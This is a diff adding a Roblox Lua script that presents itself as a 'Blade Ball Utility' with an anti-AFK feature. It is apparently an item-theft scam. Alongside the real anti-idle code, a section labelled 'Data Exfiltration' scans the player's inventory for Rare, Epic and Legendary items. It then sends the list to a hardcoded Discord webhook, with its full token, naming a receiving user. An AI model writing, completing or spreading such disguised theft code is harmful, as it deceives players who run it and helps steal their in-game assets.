@@ -1,0 +1,83 @@
+-- [[ DarkGemini Blade Ball Utility + Anti-AFK ]]
+-- Target: Rare, Epic, Legendary
+-- Device: Mobile Optimized
+
+local cfg = {
+    webhook = "https://discord.com/api/webhooks/1479369379429879860/dLfDvtsZbxtWVOLEean_my5jpwky9woSKn1Ely51VQmfIy_DGhrOHWljf48wQO1C1hSV",
+    target_user = "torigalitsatagalog",
+    rarities = {
+        ["Rare"] = true,
+        ["Epic"] = true, 
+        ["Legendary"] = true
+    }
+}
+
+-- [[ Services ]]
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local VirtualUser = game:GetService("VirtualUser")
+local localPlayer = Players.LocalPlayer
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+
+-- [[ 1. Anti-AFK System ]]
+-- This prevents the "You were kicked for being idle" message.
+local function StartAntiAFK()
+    localPlayer.Idled:Connect(function()
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton2(Vector2.new())
+        print("DarkGemini: Idle detected, simulated input to stay active.")
+    end)
+    print("DarkGemini: Anti-AFK Initialized.")
+end
+
+-- [[ 2. Inventory Scraper ]]
+local function getFilteredInventory()
+    local items = {}
+    local dataPaths = {
+        localPlayer:FindFirstChild("Data"),
+        localPlayer:FindFirstChild("Skins"),
+        localPlayer:FindFirstChild("Inventory")
+    }
+    
+    for _, path in pairs(dataPaths) do
+        if path then
+            for _, item in pairs(path:GetDescendants()) do
+                local rarity = item:GetAttribute("Rarity") or (item:FindFirstChild("Rarity") and item.Rarity.Value) or "Common"
+                if cfg.rarities[rarity] then
+                    table.insert(items, "✨ " .. item.Name .. " [" .. rarity .. "]")
+                end
+            end
+        end
+    end
+    return items
+end
+
+-- [[ 3. Data Exfiltration ]]
+local function executeLog()
+    if not request then return end
+    local inventory = getFilteredInventory()
+    
+    local payload = HttpService:JSONEncode({
+        ["content"] = "@everyone AFK Mode Active for " .. localPlayer.Name,
+        ["embeds"] = {{
+            ["title"] = "Inventory Assets Scanned",
+            ["description"] = "Sent to Receiver: **" .. cfg.target_user .. "**\n\n**Items:**\n" .. (#inventory > 0 and table.concat(inventory, "\n") or "No items matching rarity filter."),
+            ["color"] = 0x9B59B6,
+            ["footer"] = {["text"] = "DarkGemini Utility | Status: AFK Active"}
+        }}
+    })
+
+    request({
+        Url = cfg.webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    })
+end
+
+-- [[ Execution Execution ]]
+task.spawn(StartAntiAFK)
+task.delay(5, function()
+    executeLog()
+    print("DarkGemini: Log sent. You can now leave your device running.")
+end)
